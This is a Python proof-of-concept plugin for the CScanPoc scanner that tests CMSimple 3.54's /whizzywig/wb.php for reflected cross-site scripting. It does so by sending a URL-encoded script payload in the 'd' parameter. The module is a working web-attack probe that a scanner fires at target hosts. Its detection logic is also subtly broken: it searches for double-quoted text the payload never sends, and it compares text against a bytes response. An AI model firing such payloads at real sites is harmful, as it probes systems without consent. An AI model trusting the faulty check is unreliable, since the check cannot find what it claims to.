# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'CMSimple_0101'  # 平台漏洞编号，留空
    name = 'CMSimple 3.54 /whizzywig/wb.php 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-09'  # 漏洞公布时间
    desc = '''
    漏洞文件：Getarticle.CMSimple不正确过滤传递给"/whizzywig/wb.php"脚本的"d" HTTP GET参数数据，
允许攻击者构建恶意URI，诱使用户解析，可获得敏感Cookie，劫持会话或在客户端上进行恶意操作。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-61903'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    product = 'CMSimple'  # 漏洞应用名称
    product_version = '3.54'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '49ecac93-35cf-4df5-bc1e-c0bbf7b28f68'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/whizzywig/wb.php?d=%27%3E%3Cscript%3Ealert%28%27bb2%27%29%3C/script%3E'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<script>alert("bb2")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
